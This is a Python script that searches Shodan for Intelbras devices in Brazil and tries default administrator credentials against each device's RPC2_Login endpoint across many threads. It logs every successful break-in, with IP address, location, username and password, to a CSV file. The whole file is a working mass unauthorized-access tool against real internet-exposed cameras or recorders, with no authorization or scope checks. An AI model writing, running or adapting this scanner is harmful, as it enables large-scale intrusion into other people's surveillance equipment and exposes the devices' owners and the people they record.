from shodan import Shodan
import config
import requests
import threading
import math
import time
import hashlib
from colors import Colors

CREDENTIALS_LIST = [
    {"userName": "admin", "password": "admin"},
    {"userName": "admin", "password": "12345"},
    {"userName": "admin", "password": "123456789"}
]

mutex_list = {}
counter_mutex = {}
counter = {
    "success": 0,
    "errors": 0,
    "threads": 0,
}

with open('output.csv', 'w', encoding='utf-8') as f:
    f.write("IP,Port,Country,State,City,Username,Password\n")


def add_mutex(name):
    if name not in mutex_list:
        mutex_list[name] = threading.Lock()

    def decorator(function):
        def wrapper(*args, **kwargs):
            mutex_list[name].acquire()
            result = function(*args, **kwargs)
            mutex_list[name].release()
            return result
        return wrapper
    return decorator


def change_value(value, change=1):
    if value not in counter_mutex:
        counter_mutex[value] = threading.Lock()

    @add_mutex(value)
    def wrapper(value, change):
        counter[value] += change

    return wrapper(value, change)


@add_mutex("print_single")
def print_single(ip, port, country, status, color="\033[91m"):
    print(
        f"[ {Colors.green}{counter['success']} {Colors.white}| "
        f"{Colors.red}{counter['errors']} {Colors.white}] "
        f"{color}{status} http://{ip}:{port} | {country}{Colors.white}"
    )


@add_mutex("save")
def save(ip, port, country, state, city, credentials):
    location_info = f"{country},{state},{city}"
    username = credentials["userName"]
    password = credentials["password"]

    with open('output.csv', 'a', encoding='utf-8') as f:
        f.write(f"{ip},{port},{location_info},{username},{password}\n")


def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()


def send_login_request(server, country, city, state):
    try:
        ip, port = server.split(":")
        for credentials in CREDENTIALS_LIST:
            payload = {
                "method": "global.login",
                "params": {
                    "userName": credentials["userName"],
                    "password": hash_password(credentials["password"]),
                    "clientType": "Web3.0"
                },
                "id": 1
            }

            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json"
            }

            url = f"http://{ip}:{port}/RPC2_Login"
            response = requests.post(url, json=payload, headers=headers, timeout=10)

            if response.status_code == 200:
                data = response.json()

                if (
                    "result" in data 
                    and isinstance(data["result"], dict)
                    and data["result"].get("session")
                ):
                    save(ip, port, country, state, city, credentials)
                    print_single(ip, port, country, "SUCCESS", color="\033[92m")
                    change_value("success")
                    return
                else:
                    print(f"[DEBUG] Login failed for {ip}:{port} with {credentials['userName']}/{credentials['password']}")
            else:
                print(f"[DEBUG] HTTP code: {response.status_code} for {ip}:{port}")

    except requests.exceptions.ConnectionError:
        print_single(ip, port, country, "ERROR: Connection Error", color="\033[91m")
        change_value("errors")
    except requests.exceptions.Timeout:
        print_single(ip, port, country, "ERROR: Timeout", color="\033[91m")
        change_value("errors")
    except Exception as e:
        print(f"Unknown error while accessing {server}: {e}")
        change_value("errors")
    finally:
        change_value("threads", -1)


def start_thread(*args):
    while counter['threads'] >= config.MAX_THREADS:
        time.sleep(0.1)
    change_value("threads")
    threading.Thread(target=send_login_request, args=(*args,)).start()


print(f"{Colors.green}success\t{Colors.red}error{Colors.white}")

if config.SHODAN:
    api = Shodan(config.SHODAN_API)

    query = '"Intelbras" country:"BR"'

    try:
        print(f"[DEBUG] Executed query: {query}")
        count = api.count(query)['total']
        print(f"Total results: {count}")

        for page in range(math.ceil(count / 100)):
            retries = 3
            while retries > 0:
                try:
                    time.sleep(1)
                    query_results = api.search(query=query, page=page + 1)
                    print(f"[INFO] Page {page + 1} loaded successfully.")
                    for server in query_results['matches']:
                        param = f"{server['ip_str']}:{server['port']}"
                        location = server["location"]
                        city = location.get("city", "N/A")
                        state = location.get("region_code", "N/A")
                        country = location.get("country_name", "N/A")
                        start_thread(
                            param,
                            country,
                            city,
                            state,
                        )
                    break
                except Exception as e:
                    retries -= 1
                    print(f"[ERROR] Attempt failed on page {page + 1}: {e}")
                    time.sleep(5)
    except Exception as e:
        print(f"Error querying Shodan: {e}")